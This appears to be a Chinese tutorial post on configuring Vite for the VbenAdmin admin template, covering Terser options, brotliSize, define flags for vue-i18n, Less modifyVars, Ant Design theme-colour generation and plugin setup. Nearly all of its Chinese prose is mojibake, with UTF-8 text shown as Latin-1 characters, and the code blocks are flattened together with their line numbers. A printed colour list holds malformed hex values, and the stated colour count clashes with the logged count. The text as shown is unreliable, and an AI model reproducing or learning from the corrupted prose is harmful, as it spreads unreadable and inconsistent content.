Viteé…ç½®-build.terserOptionsèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šTerserOptions å‚³éçµ¦ Terser çš„æ›´å¤š minify é¸é …ã€‚\nå…¶ä»–çš„é…ç½®é …è‡ªè¡Œç ”ç©¶ï¼Œé€™è£¡åªè¨»é‡‹ä¸€ä¸‹VbenAdminé…ç½®çš„ä»£ç¢¼ã€‚\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { // ... terserOptions: { compress: { keep_infinity: true, // ç”¨æ–¼åˆªé™¤ç”Ÿç”¢ç’°å¢ƒä¸­çš„console drop_console: VITE_DROP_CONSOLE, }, }, }, // ... }; }; compressï¼šï¼ˆé»˜èª{}ï¼‰-é€šéfalseä»¥å®Œå…¨è·³éå£“ç¸®ã€‚å‚³éä¸€å€‹å°åƒä»¥æŒ‡å®šè‡ªå®šç¾©å£“ç¸®é¸é …ã€‚ compress.keep_infinityï¼šï¼ˆé»˜èªå€¼ï¼šfalseï¼‰-é€šétrueä»¥é˜²æ­¢Infinityè¢«å£“ç¸®ç‚º1/0ï¼Œé€™å¯èƒ½æœƒå°è‡´Chromeå‡ºç¾æ€§èƒ½å•é¡Œã€‚ compress.drop_consoleï¼šï¼ˆé»˜èªå€¼ï¼šfalseï¼‰-å‚³étrueä»¥æ”¾æ£„å°console.*å‡½æ•¸çš„èª¿ç”¨ ã€‚å¦‚æœæ‚¨å¸Œæœ›åœ¨åˆªé™¤å‡½æ•¸èª¿ç”¨å¾Œåˆªé™¤ç‰¹å®šçš„å‡½æ•¸èª¿ç”¨ï¼Œä¾‹å¦‚console.infoå’Œ/æˆ–ä¿ç•™å‡½æ•¸è‡ªè®Šé‡çš„å‰¯ä½œç”¨ï¼Œè«‹pure_funcsæ”¹ç”¨ã€‚ Viteé…ç½®-build.brotliSize èªªæ˜ Viteé…ç½®-build.brotliSizeèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šboolean é»˜èªï¼štrue å•Ÿç”¨/ç¦ç”¨ brotli å£“ç¸®å¤§å°å ±å‘Šã€‚å£“ç¸®å¤§å‹è¼¸å‡ºæ–‡ä»¶å¯èƒ½æœƒå¾ˆæ…¢ï¼Œå› æ­¤ç¦ç”¨è©²åŠŸèƒ½å¯èƒ½æœƒæé«˜å¤§å‹é …ç›®çš„æ§‹å»ºæ€§èƒ½ã€‚\nç¦ç”¨å°±å¥½ã€‚\næ•ˆæœå°æ¯” æ‰“é–‹å£“ç¸®å ±å‘Šï¼š4.90s\né—œé–‰å£“ç¸®å ±å‘Šï¼š3.50sï¼Œå°‘äº†å¾Œé¢ä¸€ä¸²å£“ç¸®å¤§å°ï¼Œè‚¯å®šæ›´å¿«å•¦ã€‚\nViteé…ç½®-build.chunkSizeWarningLimit èªªæ˜ Viteé…ç½®-build.chunkSizeWarningLimitèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šnumber é»˜èªï¼š500 chunk å¤§å°è­¦å‘Šçš„é™åˆ¶ï¼ˆä»¥ kbs ç‚ºå–®ä½ï¼‰ã€‚\nLimitChunkCountPlugin\nåœ¨ç·¨å¯«ä»£ç¢¼æ™‚ï¼Œæ‚¨å¯èƒ½å·²ç¶“æ·»åŠ äº†è¨±å¤šä»£ç¢¼æ‹†åˆ†é»ä»¥æŒ‰éœ€åŠ è¼‰å…§å®¹ã€‚ç·¨è­¯å¾Œï¼Œæ‚¨å¯èƒ½æœƒæ³¨æ„åˆ°ä¸€äº›å¡Šå¤ªå°äº†-é€ æˆæ›´å¤§çš„HTTPé–‹éŠ·ã€‚ LimitChunkCountPluginå¯ä»¥é€šéåˆä½µä¾†å°æ‚¨çš„å¡Šé€²è¡Œå¾Œè™•ç†ã€‚\nViteé…ç½®-define èªªæ˜ Viteé…ç½®-defineèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string\u0026gt; å®šç¾©å…¨å±€è®Šé‡æ›¿æ›æ–¹å¼ã€‚æ¯é …åœ¨é–‹ç™¼æ™‚æœƒè¢«å®šç¾©ç‚ºå…¨å±€è®Šé‡ï¼Œè€Œåœ¨æ§‹å»ºæ™‚å‰‡æ˜¯éœæ…‹æ›¿æ›ã€‚\nå¾ 2.0.0-beta.70 ç‰ˆæœ¬é–‹å§‹ï¼Œå­—ç¬¦ä¸²å€¼å°‡ä½œç‚ºä¸€å€‹ç›´æ¥çš„è¡¨é”å¼ï¼Œæ‰€ä»¥å¦‚æœå®šç¾©ç‚ºäº†ä¸€å€‹å­—ç¬¦ä¸²å¸¸é‡ï¼Œå®ƒéœ€è¦è¢«é¡¯å¼åœ°å¼•ç”¨ï¼ˆä¾‹å¦‚ï¼šé€šé JSON.stringifyï¼‰ã€‚ æ›¿æ›åªæœƒåœ¨åŒ¹é…åˆ°å‘¨åœæ˜¯å–®è©é‚Šç•Œï¼ˆ\\bï¼‰æ™‚åŸ·è¡Œã€‚ ä½¿ç”¨ çœ‹ä¸€ä¸‹vue-i18nçš„æ‡‰ç”¨ã€‚\nvue-i18nçš„å…¨å±€è®Šé‡æ›¿æ›\nåŸæ–‡ï¼š\nBundler æ§‹å»ºåŠŸèƒ½æ¨™èªŒ\nesm-bundler buildsç¾åœ¨æš´éœ²äº†å…¨å±€ç‰¹æ€§æ¨™èªŒï¼Œé€™äº›æ¨™èªŒå¯ä»¥åœ¨ç·¨è­¯æ™‚è¢«è¦†è“‹ã€‚\n__VUE_I18N_FULL_INSTALL__ï¼šå•Ÿç”¨/ç¦ç”¨ï¼Œé™¤äº†vue-i18n APIsï¼Œçµ„ä»¶å’ŒæŒ‡ä»¤éƒ½å®Œå…¨æ”¯æŒå®‰è£ï¼štrue\n__VUE_I18N_LEGACY_API__ï¼šå•Ÿç”¨/ç¦ç”¨vue-i18nå‚³çµ±é¢¨æ ¼çš„APIæ”¯æŒï¼Œé»˜èªç‚ºtrue\n__INTLIFY_PROD_DEVTOOLS__ï¼šåœ¨ç”Ÿç”¢ä¸­å•Ÿç”¨/ç¦ç”¨intlify-devtoolså’Œvue-devtoolsæ”¯æŒï¼Œé»˜èªç‚ºfalse\nåœ¨æ²’æœ‰é…ç½®é€™äº›æ¨™èªŒçš„æƒ…æ³ä¸‹ï¼Œç·¨è­¯ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œï¼Œä½†å¼·çƒˆå»ºè­°æ­£ç¢ºé…ç½®é€™äº›æ¨™èªŒï¼Œä»¥ä¾¿åœ¨æœ€çµ‚çš„bundleä¸­ç²å¾—æ­£ç¢ºçš„æ¨¹å½¢æ–å‹•ã€‚\nè¦é…ç½®é€™äº›æ¨™èªŒï¼š\nwebpack: ä½¿ç”¨ DefinePlugin Rollup: ä½¿ç”¨ @rollup/plugin-replace Viteï¼šé»˜èªé…ç½®ï¼Œä½†å¯ä»¥ä½¿ç”¨defineé¸é …è¦†è“‹ æ³¨æ„ï¼šæ›¿æ›å€¼å¿…é ˆæ˜¯å¸ƒçˆ¾æ–‡ï¼Œä¸èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå¦å‰‡bundler/minifierå°‡ç„¡æ³•æ­£ç¢ºè©•ä¼°æ¢ä»¶ã€‚\nå¦‚æ­¤ï¼Œå°±æŒ‰ç…§VbenAdminçš„åŸä»£ç¢¼ä¸€æ¨£é…ç½®å§ã€‚ä¸ç„¶vue-i18né‚„æœƒåŒ…è­¦å‘Šï¼Œç•¶ç„¶ï¼Œç¾åœ¨æˆ‘å€‘é‚„æ²’æœ‰å®‰è£vue-i18nã€‚å¾Œé¢é…ç½®åœ‹éš›åŒ–çš„æ™‚å€™å†è¬›ã€‚\nViteé…ç½®-css.preprocessorOptions èªªæ˜ Viteé…ç½®-css.preprocessorOptionsèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, object\u0026gt; æŒ‡å®šå‚³éçµ¦ CSS é è™•ç†å™¨çš„é¸é …ã€‚ä¾‹å¦‚ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 export default { css: { preprocessorOptions: { scss: { additionalData: `$injectedColor: orange;` } } } } å®‰è£less çœ¾æ‰€å‘¨çŸ¥Antdæ¡†æ¶ä½¿ç”¨çš„æ˜¯lessã€‚æ‰€ä»¥æˆ‘å€‘é€™è£¡ç ”ç©¶lessçš„é…ç½®ã€‚\nå®‰è£lessï¼š\n1 yarn add less --dev VbenAdminçš„å…¨å±€æ¨£å¼ åœ¨æ ¹ç›®éŒ„ä¸‹çš„ï¼šsrc\\designæ–‡ä»¶å¤¾ä¸­å®šç¾©äº†VbenAdminæ‰€æœ‰ å…¨å±€æ¨£å¼ å’Œ å…¨å±€lessè®Šé‡ ã€‚å…¶ä¸­åˆ†ç‚ºå…©å¤§é¡ï¼š\nsrc\\design\\index.lessï¼šå…¨å±€æ¨£å¼ï¼Œåœ¨main.tsä¸­ä½¿ç”¨ã€‚ src\\design\\config.lessï¼šå…¨å±€è®Šé‡ï¼Œåœ¨vite.config.tsä¸­ä½¿ç”¨ã€‚ è‡³æ–¼è©²æ–‡ä»¶å¤¾ä¸‹çš„å…¶ä»–æ–‡ä»¶ï¼Œéƒ½è¢«ç›´æ¥æˆ–é–“æ¥çš„å¼•å…¥åˆ°äº†index.lessã€config.lessä¸­ã€‚\næˆ‘å€‘é€™é‚Šç›´æ¥æ‹·è²æ–‡ä»¶å¤¾å°±è¡Œäº†ï¼Œæ¨£å¼ä¹Ÿæ²’å•¥ç ”ç©¶çš„ã€‚å¦‚æœæœ‰èƒ½åŠ›çš„å¯ä»¥æŠŠå’Œindex.lessç›¸é—œçš„æ–‡ä»¶éƒ½åˆªé™¤äº†ï¼Œç„¶å¾Œè‡ªå·±å¯«é—œæ–¼VbenAdminçš„æ¨£å¼ã€‚\nä½†æ˜¯è®Šé‡ä¸èƒ½å‹•ï¼Œå¾ˆå¤šéƒ½antdçš„è®Šé‡ï¼Œantd çš„ less è®Šé‡åƒè€ƒé€£çµã€‚\nè¤‡è£½å®Œä¹‹å¾Œï¼Œé †ä¾¿å°‡index.lessåœ¨main.tsä¸­å¼•ç”¨ä¸€ä¸‹ã€‚\nViteä¸­çš„Lessé…ç½® ä»£ç¢¼é…ç½® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ç”¨æ–¼å…¨å±€å°å…¥ï¼Œä»¥é¿å…éœ€è¦å–®ç¨å°å…¥æ¯å€‹æ¨£å¼æ–‡ä»¶ã€‚ // reference: é¿å…é‡è¤‡å¼•ç”¨ hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // â†“ é€™è¡Œä»£ç¢¼ä¸‹ä¸€ç« è¬› // ...generateModifyVars(), }, javascriptEnabled: true, }, }, }, // ... }; }; ä»£ç¢¼è§£æ less-@importè¦å‰‡ less-å‘½ä»¤è¡Œèªæ³• lessjs-é…ç½®é … lessjs-é…ç½®é …-javascriptEnabled \u0026amp; modifyVars less-referenceå¤–æ–‡åšå®¢ css hackåŒ¯ç¸½ å²ä¸Šæœ€å…¨çš„CSS hackæ–¹å¼ä¸€è¦½ é—œæ–¼Less jsçš„@importå¯¦é©— lesså°æ‡‰çš„å°è±¡å¯ä»¥æŸ¥çœ‹lessjs-é…ç½®é …ã€‚\njavascriptEnabled: trueé€™è¡Œä»£ç¢¼æ²’å¾—èªªï¼Œç•¢ç«Ÿantdçš„lessæ–‡ä»¶ä¸­ä½¿ç”¨JSå¯«æ³•ï¼Œæ¯”å¦‚ï¼š\\node_modules\\ant-design-vue\\lib\\style\\color\\bezierEasing.less modifyVarsæ˜¯åœ¨å…¨å±€lessæ–‡ä»¶å¾Œé¢æ·»åŠ è®Šé‡çš„é…ç½®ã€‚ modifyVarså°æ‡‰çš„å°è±¡å±¬æ€§åæœƒåŠ ä¸Š@è¿½åŠ åˆ°lessæ–‡ä»¶å¾Œã€‚ hack: true; @import (r...ï¼šé€™ä¸€è¡Œä»£ç¢¼ï¼Œåœ¨lessæ–‡ä»¶ä¸­æœƒè¢«è§£ææˆï¼š 1 @hack=true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;; é‚£é€™å€‹hackè®Šé‡æ˜¯å¹¹ä»€éº¼çš„ï¼Ÿæˆ‘æ„Ÿè¦ºå•¥ä¹Ÿæ²’æœ‰ï¼Œå–®ç´”æ˜¯ç‚ºäº†å°‡å¾Œé¢çš„@importæ¥ä¸Šçš„@importæœƒå ±éŒ¯ï¼Œåªå¯«ã€‚é€™è¡Œä»£ç¢¼å¯ä»¥éš¨ä¾¿å¯«ï¼Œæ¯”å¦‚ï¼š\n1 2 3 // yiu: `red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // â†“ è§£ææˆ,ä¸€æ¨£çš„æ•ˆæœã€‚ @yiu=red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, æˆ‘å€‹äººæ„Ÿè¦ºé€™å€‹hackå’Œcss hackå–®ç´”åå­—ä¸€æ¨£ã€‚è‡³æ–¼referenceï¼Œå¯ä»¥çœ‹ä¸€ä¸‹é—œæ–¼Less jsçš„@importå¯¦é©—é€™ç¯‡åšæ–‡å³å¯ç†è§£ã€‚åªæ˜¯æˆ‘å€‹äººç–‘æƒ‘ç‚ºä»€éº¼é€™å€‹importç‚ºä»€éº¼ä¸å¯«åœ¨globalVarsä¸­ã€‚\nViteçš„é¡è‰² èªªæ˜ è§£æbuild\\config\\themeConfig.tsæ–‡ä»¶ï¼Œç›´æ¥å‰µå»ºé€™å€‹æ–‡ä»¶ã€‚ç„¶å¾Œæˆ‘å€‘ä¸€æ®µä¸€æ®µçš„åˆ†æï¼š\n1 yarn add ant-design-vue@next ç¬¬ä¸€éƒ¨åˆ†3-16è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // â†“ é»˜èªé¡è‰² export const primaryColor = \u0026#39;#0960bd\u0026#39;; // â†“ é»˜èªä¸»é¡Œ export const themeMode = \u0026#39;light\u0026#39;; // â†“ ä¸»é¡Œé¡å‹ export type ThemeMode = \u0026#39;dark\u0026#39; | \u0026#39;light\u0026#39;; // â†“ ä¸€å€‹è§£æ±ºè‡¨æ™‚æª¢æŸ¥çš„æ–¹æ³•é¡å‹ type Fn = (...arg: any) =\u0026gt; any; // â†“ Viteç”Ÿæˆé¡è‰²çµ„çš„æ–¹æ³•åƒæ•¸ï¼Œé¡è‰²é€™ä¸€å¡Šæœ‰é»æ·±å¥§äº†ï¼Œä¸åšç´°çš„ç ”ç©¶ï¼Œæ„Ÿèˆˆè¶£çš„åŒå­¸è‡ªå·±çœ‹çœ‹æºç¢¼å§ export interface GenerateColorsParams { mixLighten: Fn; mixDarken: Fn; tinycolor: any; color?: string; } ç¬¬äºŒéƒ¨åˆ†18-22è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 import { generate } from \u0026#39;@ant-design/colors\u0026#39;; export function generateAntColors(color: string, mode: ThemeMode) { return generate(color, { theme: mode == \u0026#39;dark\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;default\u0026#39;, }); } èª¿ç”¨çš„@ant-design/colorsçš„é¡è‰²ç”Ÿæˆæ–¹æ³•ï¼Œå°‡åƒæ•¸ç°¡åŒ–äº†ä¸€ä¸‹ã€‚\nåƒè€ƒé€£çµï¼š\n@ant-design/colorsçš„npmé¦–é  Ant Design Colorsé¦–é  Ant Design è‰²æ¿ç”Ÿæˆç®—æ³•æ¼”é€²ä¹‹è·¯ ç¬¬ä¸‰éƒ¨åˆ†24-32è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 export function getThemeColors(color?: string, theme?: ThemeMode) { const tc = color || primaryColor; const tm = theme || themeMode; // â†“ å‚³å…¥çš„é¡è‰²æ ¹æ“šä¸»é¡Œç”Ÿæˆ10å€‹é¡è‰²ç³»åˆ— const colors = generateAntColors(tc, tm); // â†“ å–10å€‹é¡è‰²çš„ç¬¬6å€‹ä½œç‚ºä¸»é¡è‰² const primary = colors[5]; // â†“ å†ä½¿ç”¨ä¸»é¡è‰²æ ¹æ“šä¸»é¡Œç”Ÿæˆ10å€‹é¡è‰²ç³»åˆ— const modeColors = generateAntColors(primary, tm === \u0026#39;dark\u0026#39; ? \u0026#39;light\u0026#39; : \u0026#39;dark\u0026#39;); // â†“ è¼¸å‡ºé€™20å€‹é¡è‰² return [...colors, ...modeColors]; } ç¬¬å››éƒ¨åˆ†34-71è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 export function generateColors({ color = primaryColor, mixLighten, mixDarken, tinycolor, }: GenerateColorsParams) { const arr = new Array(19).fill(0); const lightens = arr.map((t, i) =\u0026gt; { return mixLighten(color, i / 5); }); const darkens = arr.map((t, i) =\u0026gt; { return mixDarken(color, i / 5); }); const alphaColors = arr.map((t, i) =\u0026gt; { return tinycolor(color) .setAlpha(i / 20) .toRgbString(); }); const tinycolorLightens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .lighten(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#ffffff\u0026#39;); const tinycolorDarkens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .darken(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#000000\u0026#39;); return [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]; } é€™è£¡ç›´æ¥æ ¹æ“šé¡è‰²ç”Ÿæˆäº†98ä¸­é¡è‰²ã€‚æˆ‘ç¢ºå¯¦ä¸å¤ªæ¸…æ¥šé€™å€‹éº¼å¤šé¡è‰²å¹¹ä»€éº¼çš„ã€‚èª¿ç”¨æ•ˆæœåƒè€ƒbuild\\vite\\plugin\\theme.tsï¼ˆç¾åœ¨å…ˆä¸ç®¡é€™å€‹æ–‡ä»¶ï¼‰ï¼š\nbuild/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); // ... } #0960bdç”Ÿæˆçš„é¡è‰²ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 console.log([...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]); // â†“ è¼¸å‡º [ \u0026#39;#0960bd\u0026#39;, \u0026#39;#3a80ca\u0026#39;, \u0026#39;#6ba0d7\u0026#39;, \u0026#39;#9dbfe5\u0026#39;, \u0026#39;#cedff2\u0026#39;, \u0026#39;#ffffff\u0026#39;, \u0026#39;#13011f10c\u0026#39;, \u0026#39;#16113f119\u0026#39;, \u0026#39;#19315e127\u0026#39;, \u0026#39;#1c417e134\u0026#39;, \u0026#39;#1f519e141\u0026#39;, \u0026#39;#2261be14e\u0026#39;, \u0026#39;#2571de15b\u0026#39;, \u0026#39;#2891fd169\u0026#39;, \u0026#39;#2ba21d176\u0026#39;, \u0026#39;#2eb23d183\u0026#39;, \u0026#39;#31c25d190\u0026#39;, \u0026#39;#34d27d19d\u0026#39;, \u0026#39;#37f29c1ab\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#074d97\u0026#39;, \u0026#39;#053a71\u0026#39;, \u0026#39;#04264c\u0026#39;, \u0026#39;#021326\u0026#39;, \u0026#39;#000000\u0026#39;, \u0026#39;#-2-13-26\u0026#39;, \u0026#39;#-4-26-4c\u0026#39;, \u0026#39;#-5-3a-71\u0026#39;, \u0026#39;#-7-4d-97\u0026#39;, \u0026#39;#-9-60-bd\u0026#39;, \u0026#39;#-b-73-e3\u0026#39;, \u0026#39;#-d-86-109\u0026#39;, \u0026#39;#-e-9a-12e\u0026#39;, \u0026#39;#-10-ad-154\u0026#39;, \u0026#39;#-12-c0-17a\u0026#39;, \u0026#39;#-14-d3-1a0\u0026#39;, \u0026#39;#-16-e6-1c6\u0026#39;, \u0026#39;#-17-fa-1eb\u0026#39;, \u0026#39;rgba(9, 96, 189, 0)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.05)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.1)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.15)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.2)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.25)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.3)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.35)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.4)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.45)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.5)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.55)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.6)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.65)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.7)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.75)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.8)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.85)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.9)\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0854a5\u0026#39;, \u0026#39;#07478c\u0026#39;, \u0026#39;#063b74\u0026#39;, \u0026#39;#042f5c\u0026#39;, \u0026#39;#032243\u0026#39;, \u0026#39;#02162b\u0026#39;, \u0026#39;#010913\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0a6cd5\u0026#39;, \u0026#39;#0b79ee\u0026#39;, \u0026#39;#1e86f4\u0026#39;, \u0026#39;#3793f5\u0026#39;, \u0026#39;#4fa0f7\u0026#39;, \u0026#39;#67adf8\u0026#39;, \u0026#39;#80baf9\u0026#39;, \u0026#39;#98c7fa\u0026#39;, \u0026#39;#b0d4fb\u0026#39;, \u0026#39;#c9e2fc\u0026#39;, \u0026#39;#e1effe\u0026#39;, \u0026#39;#f9fcff\u0026#39; ] console.log( [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens].length ); // â†“ è¼¸å‡º 78 ç¬¬äº”éƒ¨åˆ†73-104è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 /** * less global variable */ export function generateModifyVars() { const palettes = generateAntColors(primaryColor, themeMode); const primary = palettes[5]; const primaryColorObj: Record\u0026lt;string, string\u0026gt; = {}; for (let index = 0; index \u0026lt; 10; index++) { primaryColorObj[`primary-${index + 1}`] = palettes[index]; } return { \u0026#39;primary-color\u0026#39;: primary, ...primaryColorObj, \u0026#39;info-color\u0026#39;: primary, \u0026#39;processing-color\u0026#39;: primary, \u0026#39;success-color\u0026#39;: \u0026#39;#55D187\u0026#39;, // Success color \u0026#39;error-color\u0026#39;: \u0026#39;#ED6F6F\u0026#39;, // False color \u0026#39;warning-color\u0026#39;: \u0026#39;#EFBD47\u0026#39;, // Warning color \u0026#39;disabled-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.25)\u0026#39;, // Failure color \u0026#39;heading-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Title color \u0026#39;text-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Main text color \u0026#39;text-color-secondary\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.45)\u0026#39;, // Subtext color \u0026#39;font-size-base\u0026#39;: \u0026#39;14px\u0026#39;, // Main font size \u0026#39;box-shadow-base\u0026#39;: \u0026#39;0 2px 8px rgba(0, 0, 0, 0.15)\u0026#39;, // Floating shadow \u0026#39;border-color-base\u0026#39;: \u0026#39;#d9d9d9\u0026#39;, // Border color, \u0026#39;border-radius-base\u0026#39;: \u0026#39;2px\u0026#39;, // Component/float fillet \u0026#39;link-color\u0026#39;: primary, // Link color }; } é€™å€‹æ–¹æ³•å°±æ˜¯ç”Ÿæˆantdä¸»é¡Œè®Šé‡å°è±¡çš„ã€‚å°‡è©²å°è±¡çš„çµæœæ”¾åˆ°Viteçš„lessé…ç½®ä¸­ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ... ...generateModifyVars(), }, // ... }, }, }, // ... }; }; Viteé…ç½®-plugin èªªæ˜ Viteé…ç½®-pluginèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 (Plugin | Plugin[])[] å°‡è¦ç”¨åˆ°çš„æ’ä»¶æ•¸çµ„ã€‚æŸ¥çœ‹ æ’ä»¶ API ç²å– Vite æ’ä»¶çš„æ›´å¤šç´°ç¯€ã€‚\né…ç½®æ’ä»¶ å®ƒæ¥æ”¶ä¸€å€‹æ’ä»¶å°è±¡ï¼Œæˆ–è€…ä¸€å€‹æ’ä»¶æ•¸çµ„ã€‚ç”±æ–¼æˆ‘å€‘éœ€è¦é…ç½®å¾ˆå¤šæ’ä»¶ï¼Œè€Œæ¯ä¸€å€‹æ’ä»¶çš„é…ç½®ä¹Ÿä¸ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å€‘æŠŠæ’ä»¶æ•¸çµ„å°è£åˆ°ä¸€å€‹æ–¹æ³•ä¸­å»ã€‚çµ±ä¸€é…ç½®VbenAdminçš„æ’ä»¶ã€‚\nå‰µå»ºç”Ÿæˆæ’ä»¶æ•¸çµ„æ–¹æ³• build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { const { VITE_USE_IMAGEMIN, VITE_USE_MOCK, VITE_LEGACY, VITE_BUILD_COMPRESS } = viteEnv; const vitePlugins: (Plugin | Plugin[])[] = []; return vitePlugins; } å¾ŒçºŒé…ç½®vitePluginsé€™å€‹æ•¸çµ„ã€‚\né…ç½®Viteæ’ä»¶ vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // é …ç›®ä½¿ç”¨çš„viteæ’ä»¶ã€‚æ•¸é‡å¤§ï¼Œå–®ç¨æå–ç®¡ç† plugins: createVitePlugins(viteEnv, isBuild), // ... }; }; Viteæ’ä»¶-@vitejs-plugin-vue èªªæ˜ @vitejs/plugin-vueçš„npmé¦–é \nè¦ç·¨å¯«Vueç¨‹åºï¼Œé€™å€‹ä¸ç”¨è§£é‡‹äº†å§ï¼Œåœ¨ä½¿ç”¨Viteå‰µå»ºæ‡‰ç”¨ç¨‹åºçš„æ™‚å€™ï¼Œé€™å€‹ä¾è³´å°±å·²ç¶“é»˜èªåŠ ä¸Šäº†ã€‚\nå¼•å…¥çµ„ä»¶ vueæ’ä»¶ä¸ç”¨é…ç½®ï¼Œå¯ä»¥ç›´æ¥æ”¾é€²å»ã€‚\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vue from \u0026#39;@vitejs/plugin-vue\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue()]; // ... return vitePlugins; } Viteæ’ä»¶-@vitejs-plugin-vue-jsx èªªæ˜ ç‚ºä»€éº¼ä½¿ç”¨JSXï¼Ÿ\nå…¶å¯¦JSXçš„æ•ˆæœå’Œæˆ‘å€‘åœ¨vueçš„templateä¸­å¯«çš„ä»£ç¢¼æ•ˆæœæ˜¯ä¸€æ¨£çš„ã€‚æœ€çµ‚éƒ½æœƒè¢«æ¸²æŸ“æˆcreateElementã€‚ å€åˆ¥æ˜¯templateçš„æ¨™ç±¤æ˜¯ä¸å¯è®Šçš„ï¼Œæˆ‘å€‘è¦å¯¦ç¾å‹•æ…‹æ¨™ç±¤ï¼Œåªèƒ½ä½¿ç”¨v-ifã€‚è€ŒJSXçš„æœ€å¤§ç‰¹é»å°±æ˜¯éˆæ´»ï¼Œæˆ‘å€‘å¯ä»¥éš¨æ„çµ„è£HTMLä»£ç¢¼ã€‚ 